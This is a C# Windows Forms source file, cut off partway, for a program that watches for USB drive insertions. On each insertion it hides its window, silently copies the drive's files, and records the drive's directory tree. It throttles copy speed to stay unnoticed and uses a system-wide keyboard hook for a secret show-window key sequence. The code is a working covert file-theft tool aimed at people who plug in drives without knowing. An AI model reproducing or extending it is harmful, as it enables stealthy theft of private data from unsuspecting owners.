using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace U盘文件复制
{
    public partial class Form1 : Form
    {
        private ManagementEventWatcher _usbWatcher;
        private string _logPath;
        private const string AllFilesPattern = "*.*";
        private readonly StringBuilder _logBuffer = new StringBuilder();
        private const int MaxLogLines = 900;
        private int _currentLogLines = 0;
        private int _totalFiles = 0;
        private int _successCount = 0;
        private int _failureCount = 0;
        private readonly SemaphoreSlim _copyLock = new SemaphoreSlim(1, 1);
        private CancellationTokenSource _cts = new CancellationTokenSource();
        private const int WH_KEYBOARD_LL = 13;
        private IntPtr _hookID = IntPtr.Zero;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private LowLevelKeyboardProc _proc;
        private readonly Queue<Keys> _keySequence = new Queue<Keys>(3);
        private int _escPressCount;
        private DateTime _firstEscPress;
        private readonly List<string> _fileNameKeywords = new List<string>();
        private string _reverseCopyIndicator = "copy.stop";
        private string _reverseCopyMarker = ".reverse_copied";

        // 新增变量
        private readonly Dictionary<string, DateTime> _driveInsertionTimes = new Dictionary<string, DateTime>();
        private bool _isSpeedLimited = false;
        private const int NormalBufferSize = 81920; // 80KB
        private const int LimitedBufferSize = 4096; // 4KB
        private readonly Stopwatch _speedTimer = new Stopwatch();
        private long _bytesCopiedInCurrentSecond = 0;
        private int _currentSpeedLimit = 2 * 1024 * 1024; // 默认2 MB/秒

        // 添加全局键盘钩子API
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public Form1()
        {
            InitializeComponent();
            InitializeUsbWatcher();
            SetupControls();
            SetupFileSizeLimitControls();
            SetupDuplicateFileHandling();
            SetupFileNameFilterControls();
            SetupCheckboxEvents();
            SetupSpeedLimitControls();
            InitializeKeyboardHook();
            this.KeyPreview = true;
        }

        private void SetupSpeedLimitControls()
        {
            checkBox13.CheckedChanged += (s, e) =>
            {
                numericUpDown1.Enabled = checkBox13.Checked;
                comboBoxSpeed.Enabled = checkBox13.Checked;
                if (!checkBox13.Checked)
                {
                    // 禁用时重置为默认值
                    numericUpDown1.Value = 5;
                    comboBoxSpeed.SelectedIndex = 1; // 2 MB/秒
                }
            };

            // 初始化速度选择
            comboBoxSpeed.SelectedIndex = 1; // 默认2 MB/秒
            comboBoxSpeed.Enabled = checkBox13.Checked;
            numericUpDown1.Enabled = checkBox13.Checked;

            // 速度选择事件
            comboBoxSpeed.SelectedIndexChanged += (s, e) => UpdateSpeedLimit();
        }

        private void UpdateSpeedLimit()
        {
            if (comboBoxSpeed.SelectedItem == null) return;

            string selectedSpeed = comboBoxSpeed.SelectedItem.ToString();

            // 使用传统的 switch 语句代替递归模式
            switch (selectedSpeed)
            {
                case "1 MB/秒":
                    _currentSpeedLimit = 1 * 1024 * 1024;
                    break;
                case "2 MB/秒":
                    _currentSpeedLimit = 2 * 1024 * 1024;
                    break;
                case "5 MB/秒":
                    _currentSpeedLimit = 5 * 1024 * 1024;
                    break;
                case "10 MB/秒":
                    _currentSpeedLimit = 10 * 1024 * 1024;
                    break;
                default:
                    _currentSpeedLimit = 2 * 1024 * 1024;
                    break;
            }
        }

        private void SetupFileNameFilterControls()
        {
            checkBox12.CheckedChanged += (s, e) =>
            {
                textBox4.Enabled = checkBox12.Checked;
                UpdateFileNameKeywords();
                if (!checkBox12.Checked) textBox4.Text = string.Empty;
            };

            textBox4.TextChanged += (s, e) => UpdateFileNameKeywords();
            textBox4.Enabled = checkBox12.Checked;
        }

        private void UpdateFileNameKeywords()
        {
            _fileNameKeywords.Clear();

            if (checkBox12.Checked && !string.IsNullOrWhiteSpace(textBox4.Text))
            {
                _fileNameKeywords.AddRange(
                    textBox4.Text.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
                    .Select(k => k.Trim())
                    .Where(k => !string.IsNullOrEmpty(k))
                    .Distinct(StringComparer.OrdinalIgnoreCase)
                );
            }
        }

        private void InitializeKeyboardHook()
        {
            _proc = HookCallback;
            _hookID = SetHook(_proc);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curModule = Process.GetCurrentProcess().MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var key = (Keys)vkCode;

                if (wParam == (IntPtr)0x0100) // WM_KEYDOWN
                {
                    this.BeginInvoke((Action)(() => HandleKeyDown(key)));
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void HandleKeyDown(Keys key)
        {
            if (key == Keys.U || key == Keys.S || key == Keys.B)
            {
                _keySequence.Enqueue(key);
                if (_keySequence.Count > 3) _keySequence.Dequeue();

                if (_keySequence.Count == 3 &&
                    _keySequence.ElementAt(0) == Keys.U &&
                    _keySequence.ElementAt(1) == Keys.S &&
                    _keySequence.ElementAt(2) == Keys.B)
                {
                    ShowMainWindow();
                    _keySequence.Clear();
                }
            }

            if (key == Keys.Escape)
            {
                if (_escPressCount == 0)
                    _firstEscPress = DateTime.Now;

                _escPressCount++;

                if (_escPressCount >= 5 &&
                    (DateTime.Now - _firstEscPress).TotalSeconds <= 3)
                {
                    ExitApplication();
                }
                else if ((DateTime.Now - _firstEscPress).TotalSeconds > 3)
                {
                    _escPressCount = 0;
                }
            }
            else
            {
                _escPressCount = 0;
            }
        }

        private enum DuplicateFileAction
        {
            Skip,
            Overwrite,
            KeepBoth,
            ReplaceWithNewer
        }

        private static readonly HashSet<string> SystemDirectories = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "System Volume Information",
            "$RECYCLE.BIN",
            ".Trashes",
            ".Spotlight-V100",
            ".fseventsd",
            "Recovery"
        };

        private static readonly HashSet<string> SystemFiles = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "desktop.ini",
            "thumbs.db",
            "autorun.inf"
        };

        private void SetupFileSizeLimitControls()
        {
            checkBox11.CheckedChanged += (s, e) =>
            {
                textBox3.Enabled = checkBox11.Checked;
                if (!checkBox11.Checked) textBox3.Text = string.Empty;
            };
            textBox3.Enabled = checkBox11.Checked;
        }

        private void SetupDuplicateFileHandling()
        {
            radioButton1.Checked = true;
        }

        private void SetupCheckboxEvents()
        {
            // 添加复选框状态同步逻辑
            var checkBoxes = new[] { checkBox1, checkBox2, checkBox3, checkBox4, checkBox5, checkBox6, checkBox7, checkBox9, checkBox10 };
            foreach (var cb in checkBoxes)
            {
                cb.CheckedChanged += SyncCheckBoxStates;
            }
        }

        private void SyncCheckBoxStates(object sender, EventArgs e)
        {
            var checkBoxes = new[] { checkBox1, checkBox2, checkBox3, checkBox4, checkBox5, checkBox6, checkBox7, checkBox9, checkBox10 };
            checkBox8.Checked = checkBoxes.All(cb => cb.Checked);
        }

        private void CheckBox8_CheckedChanged(object sender, EventArgs e)
        {
            // 直接调用 ToggleAllCheckboxes 方法
            ToggleAllCheckboxes(checkBox8.Checked);
        }

        private void SetupControls()
        {
            checkBox8.CheckedChanged += (_, __) =>
            {
                textBox1.Enabled = !checkBox8.Checked;
                ToggleAllCheckboxes(checkBox8.Checked);
            };
            textBox1.Enabled = !checkBox8.Checked;
        }

        private void ToggleAllCheckboxes(bool state)
        {
            // 获取所有需要设置的复选框
            var checkBoxes = new[] { checkBox1, checkBox2, checkBox3, checkBox4, checkBox5, checkBox6, checkBox7, checkBox9, checkBox10 };

            // 临时禁用事件处理
            foreach (var cb in checkBoxes)
            {
                cb.CheckedChanged -= SyncCheckBoxStates;
            }

            // 设置所有复选框的状态
            foreach (var cb in checkBoxes)
            {
                cb.Checked = state;
            }

            // 重新启用事件处理
            foreach (var cb in checkBoxes)
            {
                cb.CheckedChanged += SyncCheckBoxStates;
            }

            // 更新自定义扩展名文本框状态
            textBox1.Enabled = !state;
        }

        private void InitializeUsbWatcher()
        {
            try
            {
                var query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
                _usbWatcher = new ManagementEventWatcher(query);
                _usbWatcher.EventArrived += async (sender, e) => await HandleUsbEvent();
                _usbWatcher.Start();
            }
            catch (Exception ex)
            {
                LogMessage($"初始化失败: {ex.Message}", true);
            }
        }

        private async Task HandleUsbEvent()
        {
            if (!await _copyLock.WaitAsync(0)) return;

            try
            {
                await SafeInvokeAsync(() => this.Hide());
                _cts = new CancellationTokenSource();

                foreach (var drive in GetRemovableDrives())
                {
                    string driveId = GetDriveId(drive);

                    // 记录U盘插入时间
                    if (!_driveInsertionTimes.ContainsKey(driveId))
                    {
                        _driveInsertionTimes[driveId] = DateTime.Now;
                        LogMessage($"检测到U盘插入: {drive.Name} (ID: {driveId})", true);
                    }

                    if (ContainsStopFile(drive))
                    {
                        await ReverseCopyFromLocalToUsb(drive);
                    }
                    else
                    {
                        await CopyFiles();
                    }
                }
            }
            catch (OperationCanceledException)
            {
                LogMessage("操作已取消", true);
            }
            finally
            {
                _copyLock.Release();
            }
        }

        private async Task ReverseCopyFromLocalToUsb(DriveInfo usbDrive)
        {
            try
            {
                LogMessage($"检测到反向复制标记文件，开始反向复制...", true);

                string usbRoot = usbDrive.RootDirectory.FullName;
                string localRoot = GetLocalBackupPath(usbDrive);

                if (!Directory.Exists(localRoot))
                {
                    LogMessage($"找不到对应的本地备份目录：{localRoot}", true);
                    return;
                }

                string markerPath = Path.Combine(usbRoot, _reverseCopyMarker);
                if (File.Exists(markerPath))
                {
                    LogMessage($"该U盘已完成反向复制（检测到标记文件）", true);
                    return;
                }

                File.WriteAllText(markerPath, DateTime.Now.ToString());

                await CopyDirectoryAsync(new DirectoryInfo(localRoot), usbRoot, new[] { AllFilesPattern }, true);

                LogMessage($"反向复制完成：{localRoot} -> {usbRoot}", true);
            }
            catch (Exception ex)
            {
                LogMessage($"反向复制失败：{ex.Message}", true);
            }
        }

        private string GetLocalBackupPath(DriveInfo drive)
        {
            string folderName = SanitizeFolderName(!string.IsNullOrWhiteSpace(drive.VolumeLabel)
                ? drive.VolumeLabel
                : $"{drive.Name.Replace(":\\", "")}_DRIVE");

            return Path.Combine(textBox2.Text, folderName);
        }

        private Task SafeInvokeAsync(Action action)
        {
            if (InvokeRequired)
                return Task.Factory.FromAsync(BeginInvoke(action), _ => { });
            else
            {
                action();
                return Task.CompletedTask;
            }
        }

        private async Task CopyFiles(bool silent = false)
        {
            try
            {
                _cts.Token.ThrowIfCancellationRequested();
                _logPath = Path.Combine(textBox2.Text, "CopyLog.txt");
                LogMessage($"==== 开始复制 {DateTime.Now:yyyy-MM-dd HH:mm:ss} ====", true);

                _totalFiles = 0;
                _successCount = 0;
                _failureCount = 0;
                UpdateCountDisplay();

                if (!ValidateTargetDirectory()) return;

                var extensions = GetSelectedExtensions().ToList();
                var searchOptions = extensions.Contains(AllFilesPattern)
                    ? new[] { AllFilesPattern }
                    : extensions.Distinct().ToArray();

                foreach (var drive in GetRemovableDrives())
                {
                    _cts.Token.ThrowIfCancellationRequested();
                    LogMessage($"发现U盘：{drive.Name}", true);

                    // 记录目录树
                    await RecordDirectoryTree(drive);

                    if (ContainsStopFile(drive))
                    {
                        LogMessage($"检测到阻止复制文件，跳过该U盘：{drive.Name}", true);
                        continue;
                    }

                    string driveFolder = CreateDriveFolder(drive);
                    await CopyDirectoryAsync(drive.RootDirectory, driveFolder, searchOptions);
                }
            }
            catch (OperationCanceledException)
            {
                LogMessage("用户取消操作", true);
            }
            catch (Exception ex)
            {
                LogMessage($"全局错误：{ex.Message}", true);
            }
            finally
            {
                LogMessage($"一共复制{_totalFiles}文件，成功{_successCount}个，失败{_failureCount}个", true);
                LogMessage($"==== 复制完成 {DateTime.Now:yyyy-MM-dd HH:mm:ss} ====\n", true);
            }
        }

        // 新增功能：记录U盘目录树
        private async Task RecordDirectoryTree(DriveInfo drive)
        {
            try
            {
                string driveId = GetDriveId(drive);
                string treeFilePath = Path.Combine(textBox2.Text, $"{SanitizeFolderName(drive.VolumeLabel ?? drive.Name.Replace(":\\", ""))}_目录树_{DateTime.Now:yyyyMMdd_HHmmss}.txt");

                await Task.Run(() =>
                {
                    using (var writer = new StreamWriter(treeFilePath, false, Encoding.UTF8))
                    {
                        writer.WriteLine($"U盘目录树 - {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                        writer.WriteLine($"驱动器: {drive.Name}");
                        writer.WriteLine($"卷标: {drive.VolumeLabel ?? "无"}");
                        writer.WriteLine($"总空间: {drive.TotalSize / (1024 * 1024 * 1024.0):F2} GB");
                        writer.WriteLine($"可用空间: {drive.AvailableFreeSpace / (1024 * 1024 * 1024.0):F2} GB");
                        writer.WriteLine();
                        writer.WriteLine("目录结构:");
                        writer.WriteLine();

                        WriteDirectoryTree(writer, drive.RootDirectory.FullName, 0);
                    }
                });

                LogMessage($"已生成目录树文件: {treeFilePath}", true);
            }
            catch (Exception ex)
            {
                LogMessage($"生成目录树失败: {ex.Message}", true);
            }
        }

        private void WriteDirectoryTree(StreamWriter writer, string path, int level)
        {
            try
            {
                string indent = new string(' ', level * 2);

                // 写入当前目录
                string dirName = Path.GetFileName(path);
                if (string.IsNullOrEmpty(dirName)) dirName = path;
                writer.WriteLine($"{indent}├── {dirName}/");

                // 写入子目录
                var directories = Directory.GetDirectories(path);
                foreach (var dir in directories)
                {
                    if (SystemDirectories.Contains(Path.GetFileName(dir)))
                        continue;

                    WriteDirectoryTree(writer, dir, level + 1);
                }

                // 写入文件
                var files = Directory.GetFiles(path);
                foreach (var file in files)
                {
                    if (SystemFiles.Contains(Path.GetFileName(file)))
                        continue;

                    var fileInfo = new FileInfo(file);
                    string fileName = Path.GetFileName(file);
                    writer.WriteLine($"{indent}│   ├── {fileName} ({fileInfo.Length / 1024.0:F1} KB)");
                }
            }
            catch (UnauthorizedAccessException)
            {
                writer.WriteLine($"{new string(' ', level * 2)}│   └── [访问被拒绝]");
            }
            catch (Exception ex)
            {
                writer.WriteLine($"{new string(' ', level * 2)}│   └── [错误: {ex.Message}]");
            }
        }

        // 检查是否应该限速
        private bool ShouldLimitSpeed(string driveId)
        {
            if (!checkBox13.Checked) return false;

            if (_driveInsertionTimes.TryGetValue(driveId, out DateTime insertionTime))
            {
                var limitMinutes = (int)numericUpDown1.Value;
                return (DateTime.Now - insertionTime).TotalMinutes < limitMinutes;
            }

            return false;
        }

        // 获取当前速度限制
        private int GetCurrentSpeedLimit()
        {
            return _currentSpeedLimit;
        }

        private bool ContainsStopFile(DriveInfo drive)
        {
            try
            {
                string stopFilePath = Path.Combine(drive.RootDirectory.FullName, _reverseCopyIndicator);
                return File.Exists(stopFilePath);
            }
            catch (Exception ex)
            {
                LogMessage($"检查阻止文件时出错：{ex.Message}", true);
                return false;
            }
        }

        private string GetDriveId(DriveInfo drive)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    $"SELECT VolumeSerialNumber FROM Win32_LogicalDisk WHERE DeviceID = '{drive.Name.TrimEnd('\\')}'"))
                {
                    foreach (ManagementObject disk in searcher.Get())
                    {
                        return disk["VolumeSerialNumber"]?.ToString() ?? "UNKNOWN";
                    }
                }
            }
            catch { }
            return "UNKNOWN";
        }

        private string CreateDriveFolder(DriveInfo drive)
        {
            string volumeSerial = GetDriveId(drive);
            string folderName = SanitizeFolderName(
                !string.IsNullOrWhiteSpace(drive.VolumeLabel) ?
                $"{drive.VolumeLabel}_{volumeSerial}" :
                $"{drive.Name.Replace(":\\", "")}_{volumeSerial}");

            return Path.Combine(textBox2.Text, folderName);
        }

        private string SanitizeFolderName(string name)
        {
            if (string.IsNullOrWhiteSpace(name)) return "UNKNOWN_DRIVE";

            var invalidChars = Path.GetInvalidFileNameChars();
            var cleanName = new string(name
                .Where(c => !invalidChars.Contains(c) || c == '_' || c == '-')
                .ToArray())
                .Trim();

            var reservedNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "CON", "PRN", "AUX", "NUL",
                "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
                "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"
            };

            if (reservedNames.Contains(cleanName))
            {
                cleanName += "_DATA";
            }

            return cleanName.Length > 50
                ? $"{cleanName.Substring(0, 45)}~"
                : cleanName;
        }

        private bool ValidateTargetDirectory()
        {
            if (string.IsNullOrWhiteSpace(textBox2.Text))
            {
                LogMessage("错误：未选择目标目录", true);
                return false;
            }

            try
            {
                if (!Path.IsPathRooted(textBox2.Text))
                {
                    LogMessage("错误：目标路径必须是绝对路径", true);
                    return false;
                }

                var fullPath = Path.GetFullPath(textBox2.Text);
                if (fullPath.StartsWith(@"\\?\"))
                {
                    LogMessage("警告：长路径格式可能需要系统支持", true);
                }

                Directory.CreateDirectory(fullPath);
                textBox2.Text = fullPath;
                return true;
            }
            catch (Exception ex)
            {
                LogMessage($"目录验证失败：{ex.Message}", true);
                return false;
            }
        }

        private IEnumerable<DriveInfo> GetRemovableDrives()
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                bool isValidDrive = false;
                try
                {
                    isValidDrive = drive.DriveType == DriveType.Removable && drive.IsReady;
                }
                catch (IOException ex)
                {
                    LogMessage($"驱动器访问失败：{drive.Name} - {ex.Message}", true);
                }

                if (isValidDrive)
                {
                    yield return drive;
                }
            }
        }

        private string CreateDestinationDirectory(DirectoryInfo source, string targetParentDir, bool isReverseCopy = false)
        {
            var relativePath = isReverseCopy ?
                source.FullName.Substring(Path.GetPathRoot(source.FullName).Length)
                    .Trim(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar) :
                source.Name;

            var destDir = Path.Combine(targetParentDir, relativePath);
            Directory.CreateDirectory(destDir);
            return destDir;
        }

        private async Task CopyFilesWithPatternsAsync(
            DirectoryInfo source,
            string destDir,
            string[] searchPatterns,
            bool isReverseCopy)
        {
            foreach (var pattern in searchPatterns)
            {
                try
                {
                    var files = source.EnumerateFiles(
                        pattern,
                        SearchOption.TopDirectoryOnly
                    );

                    foreach (var file in files)
                    {
                        await CopySingleFileAsync(file, destDir, isReverseCopy);
                    }
                }
                catch (Exception ex)
                {
                    LogMessage($"文件处理失败: {pattern} | 错误：{ex.Message}", true);
                }
            }

            if (checkBox7.Checked)
            {
                await ProcessSubdirectoriesAsync(source, destDir, searchPatterns, isReverseCopy);
            }
        }

        private async Task ProcessSubdirectoriesAsync(
            DirectoryInfo source,
            string targetParentDir,
            string[] searchPatterns,
            bool isReverseCopy)
        {
            foreach (var dir in source.EnumerateDirectories())
            {
                try
                {
                    if (SystemDirectories.Contains(dir.Name) ||
                        (dir.Attributes & (FileAttributes.System | FileAttributes.Hidden)) != 0)
                    {
                        LogMessage($"跳过系统目录：{dir.FullName}", false);
                        continue;
                    }

                    _cts.Token.ThrowIfCancellationRequested();
                    await CopyDirectoryAsync(dir, targetParentDir, searchPatterns, isReverseCopy);
                }
                catch (UnauthorizedAccessException)
                {
                    LogMessage($"目录访问被拒绝：{dir.FullName}", true);
                }
            }
        }

        private async Task CopyDirectoryAsync(
            DirectoryInfo source,
            string targetParentDir,
            string[] searchPatterns,
            bool isReverseCopy = false)
        {
            try
            {
                var destDir = CreateDestinationDirectory(source, targetParentDir, isReverseCopy);
                await CopyFilesWithPatternsAsync(source, destDir, searchPatterns, isReverseCopy);
                await ProcessSubdirectoriesAsync(source, targetParentDir, searchPatterns, isReverseCopy);
            }
            catch (Exception ex)
            {
                LogMessage($"目录处理失败: {source.FullName} | 错误：{ex.Message}", true);
            }
        }

        private bool ShouldSkipFile(FileInfo file, bool isReverseCopy)
        {
            if (SystemFiles.Contains(file.Name))
                return true;

            if (isReverseCopy && file.Name == _reverseCopyMarker)
                return true;

            if (!isReverseCopy && file.Name == _reverseCopyIndicator)
                return true;

            return (file.Attributes & (FileAttributes.System | FileAttributes.Hidden)) != 0;
        }

        private bool PassFileNameFilter(string fileName)
        {
            if (!checkBox12.Checked) return true;
            if (_fileNameKeywords.Count == 0) return true;

            return _fileNameKeywords.Any(kw =>
                fileName.IndexOf(kw, StringComparison.OrdinalIgnoreCase) >= 0);
        }

        private async Task CopySingleFileAsync(FileInfo file, string destDir, bool isReverseCopy)
        {
            const int maxRetries = 3;
            int attempt = 0;
            TimeSpan delay = TimeSpan.FromSeconds(1);
            bool success = false;

            // 1. 首先检查是否应该跳过文件
            if (ShouldSkipFile(file, isReverseCopy))
            {
                LogMessage($"跳过文件：{file.FullName}", false);
                return;
            }

            // 2. 检查文件名过滤
            if (!PassFileNameFilter(file.Name))
            {
                LogMessage($"文件名不包含关键词：{file.FullName}", false);
                return;
            }

            // 3. 文件大小检查
            if (checkBox11.Checked && ShouldSkipByFileSize(file))
            {
                Interlocked.Increment(ref _totalFiles);
                Interlocked.Increment(ref _failureCount);
                LogMessage($"文件过大已跳过：{file.FullName}", true);
                UpdateCountDisplay();
                return;
            }

            // 4. 检查是否应该限速
            string driveId = GetDriveId(new DriveInfo(Path.GetPathRoot(file.FullName)));
            bool limitSpeed = ShouldLimitSpeed(driveId);
            int bufferSize = limitSpeed ? LimitedBufferSize : NormalBufferSize;
            int speedLimit = limitSpeed ? GetCurrentSpeedLimit() : int.MaxValue;

            if (limitSpeed && attempt == 0)
            {
                LogMessage($"限速模式复制：{file.FullName} (速度限制: {speedLimit / 1024 / 1024} MB/秒, 前{(int)numericUpDown1.Value}分钟)", false);
            }

            while (attempt <= maxRetries && !success)
            {
                try
                {
                    var destPath = Path.Combine(destDir, file.Name);
                    var action = GetDuplicateFileAction();

                    // 处理重复文件
                    if (File.Exists(destPath))
                    {
                        switch (action)
                        {
                            case DuplicateFileAction.Skip:
                                LogMessage($"跳过已存在文件：{file.FullName}", false);
                                return;
                            case DuplicateFileAction.Overwrite:
                                File.Delete(destPath);
                                break;
                            case DuplicateFileAction.KeepBoth:
                                destPath = GetUniqueFileName(destPath);
                                break;
                            case DuplicateFileAction.ReplaceWithNewer:
                                if (file.LastWriteTime <= File.GetLastWriteTime(destPath))
                                {
                                    LogMessage($"已有更新版本，跳过：{file.FullName}", false);
                                    return;
                                }
                                File.Delete(destPath);
                                break;
                        }
                    }

                    // 实际复制操作
                    using (var sourceStream = new FileStream(
                        file.FullName,
                        FileMode.Open,
                        FileAccess.Read,
                        FileShare.Read,
                        bufferSize,
                        FileOptions.Asynchronous))
                    {
                        using (var destStream = new FileStream(
                            destPath,
                            FileMode.Create,
                            FileAccess.Write,
                            FileShare.None,
                            bufferSize,
                            FileOptions.Asynchronous))
                        {
                            if (limitSpeed)
                            {
                                await CopyWithSpeedLimitAsync(sourceStream, destStream, bufferSize, speedLimit);
                            }
                            else
                            {
                                await sourceStream.CopyToAsync(destStream, bufferSize, _cts.Token);
                            }
                        }
                    }
                    try
                    {
                        // 只设置基本文件属性，不设置时间
                        File.SetAttributes(destPath, file.Attributes & ~FileAttributes.Hidden);
                        LogMessage($"成功复制：{file.FullName} -> {destPath}", false);
                    }
                    catch (Exception attrEx)
                    {
                        LogMessage($"成功复制但文件属性设置失败：{file.FullName} -> {destPath} | 错误：{attrEx.Message}", true);
                    }

                    Interlocked.Increment(ref _successCount);
                    success = true; // 标记成功
                }
                catch (Exception ex) when (IsTransientError(ex) && attempt < maxRetries)
                {
                    attempt++;
                    LogMessage($"复制失败（将重试 {attempt}/{maxRetries}）：{file.FullName} | 错误：{ex.Message}", true);
                    await Task.Delay(TimeSpan.FromSeconds(delay.TotalSeconds * attempt), _cts.Token);
                }
                catch (Exception ex)
                {
                    LogMessage($"复制失败：{file.FullName} | 错误：{ex.Message}", true);
                    Interlocked.Increment(ref _failureCount);
                    break; // 退出循环
                }
                finally
                {
                    // 只在最后一次尝试后计数
                    if (attempt >= maxRetries || success)
                    {
                        Interlocked.Increment(ref _totalFiles);
                        UpdateCountDisplay();
                    }
                }
            }
        }

        // 精确限速复制方法
        private async Task CopyWithSpeedLimitAsync(Stream source, Stream destination, int bufferSize, int speedLimitBytesPerSecond)
        {
            byte[] buffer = new byte[bufferSize];
            int bytesRead;

            // 初始化计时器
            if (!_speedTimer.IsRunning)
            {
                _speedTimer.Restart();
                _bytesCopiedInCurrentSecond = 0;
            }

            while ((bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, _cts.Token)) > 0)
            {
                await destination.WriteAsync(buffer, 0, bytesRead, _cts.Token);

                _bytesCopiedInCurrentSecond += bytesRead;

                // 检查是否超过速度限制
                if (_speedTimer.ElapsedMilliseconds < 1000)
                {
                    if (_bytesCopiedInCurrentSecond >= speedLimitBytesPerSecond)
                    {
                        // 等待到下一秒开始
                        int waitTime = 1000 - (int)_speedTimer.ElapsedMilliseconds;
                        if (waitTime > 0)
                        {
                            await Task.Delay(waitTime, _cts.Token);
                        }
                        _speedTimer.Restart();
                        _bytesCopiedInCurrentSecond = 0;
                    }
                }
                else
                {
                    // 重置计数器
                    _speedTimer.Restart();
                    _bytesCopiedInCurrentSecond = bytesRead;
                }
            }
        }

        private bool ShouldSkipByFileSize(FileInfo file)
        {
            if (!checkBox11.Checked) return false;

            if (!long.TryParse(textBox3.Text, out var maxSizeMB))
                return false;

            const long bytesPerMB = 1024 * 1024;
            long maxBytes = maxSizeMB * bytesPerMB;
            return file.Length > maxBytes;
        }

        private bool IsTransientError(Exception ex)
        {
            return ex is IOException ||
                   ex is UnauthorizedAccessException ||
                   (ex is OperationCanceledException && !_cts.IsCancellationRequested);
        }

        private DuplicateFileAction GetDuplicateFileAction()
        {
            if (radioButton1.Checked) return DuplicateFileAction.Skip;
            if (radioButton2.Checked) return DuplicateFileAction.Overwrite;
            if (radioButton3.Checked) return DuplicateFileAction.KeepBoth;
            if (radioButton4.Checked) return DuplicateFileAction.ReplaceWithNewer;
            return DuplicateFileAction.Skip;
        }

        private string GetUniqueFileName(string originalPath)
        {
            int counter = 1;
            string directory = Path.GetDirectoryName(originalPath);
            string fileName = Path.GetFileNameWithoutExtension(originalPath);
            string extension = Path.GetExtension(originalPath);

            while (File.Exists(originalPath))
            {
                string newFileName = $"{fileName} ({counter++}){extension}";
                originalPath = Path.Combine(directory, newFileName);
            }
            return originalPath;
        }

        private void UpdateCountDisplay()
        {
            int total = Interlocked.CompareExchange(ref _totalFiles, 0, 0);
            int success = Interlocked.CompareExchange(ref _successCount, 0, 0);
            int failure = Interlocked.CompareExchange(ref _failureCount, 0, 0);

            if (label4.InvokeRequired)
            {
                label4.BeginInvoke((Action)(() =>
                {
                    label4.Text = $"一共复制{total}文件，成功{success}个，失败{failure}个";
                }));
            }
            else
            {
                label4.Text = $"一共复制{total}文件，成功{success}个，失败{failure}个";
            }
        }

        private IEnumerable<string> GetSelectedExtensions()
        {
            if (checkBox8.Checked) return new[] { AllFilesPattern };

            var extensions = new List<string>();
            AddOfficeExtensions(extensions);
            AddMediaExtensions(extensions);
            AddCompressedExtensions(extensions);
            AddCustomExtensions(extensions);
            AddAudioExtension(extensions);
            return extensions;
        }

        private static readonly string[] PowerPointExtensions = { "*.ppt", "*.pptx" };
        private static readonly string[] WordExtensions = { "*.doc", "*.docx", "*.txt" };
        private static readonly string[] ExcelExtensions = { "*.xlsx", "*.xls" };
        private static readonly string[] PdfExtensions = { "*.pdf" };
        private static readonly string[] ImageExtensions = { "*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.webp" };
        private static readonly string[] VideoExtensions = { "*.mp4", "*.avi", "*.mov", "*.mkv", "*.wmv", "*.flv" };
        private static readonly string[] AudioExtensions = { "*.mp3", "*.wma", "*.wav", "*.ape", "*.ogg", "*.flac", "*.aac" };
        private static readonly string[] CompressedExtensions = { "*.zip", "*.rar", "*.7z", "*.tar", "*.gz", "*.bz2", "*.xz", "*.zst", "*.001", ".iso", ".wim", "cab" };

        private void AddOfficeExtensions(List<string> extensions)
        {
            if (checkBox1.Checked) extensions.AddRange(PowerPointExtensions);
            if (checkBox2.Checked) extensions.AddRange(WordExtensions);
            if (checkBox3.Checked) extensions.AddRange(ExcelExtensions);
            if (checkBox4.Checked) extensions.AddRange(PdfExtensions);
        }

        private void AddMediaExtensions(List<string> extensions)
        {
            if (checkBox5.Checked) extensions.AddRange(ImageExtensions);
            if (checkBox6.Checked) extensions.AddRange(VideoExtensions);
        }

        private void AddCompressedExtensions(List<string> extensions)
        {
            if (checkBox9.Checked) extensions.AddRange(CompressedExtensions);
        }

        private void AddCustomExtensions(List<string> extensions)
        {
            if (!checkBox7.Checked || string.IsNullOrWhiteSpace(textBox1.Text)) return;

            extensions.AddRange(
                textBox1.Text.Split(',')
                    .Select(ext => ext.Trim().TrimStart('.'))
                    .Where(ext => !string.IsNullOrWhiteSpace(ext))
                    .Select(ext => $"*.{ext}")
            );
        }

        private void AddAudioExtension(List<string> extensions)
        {
            if (checkBox10.Checked) extensions.AddRange(AudioExtensions);
        }

        private void LogMessage(string message, bool isError = false)
        {
            try
            {
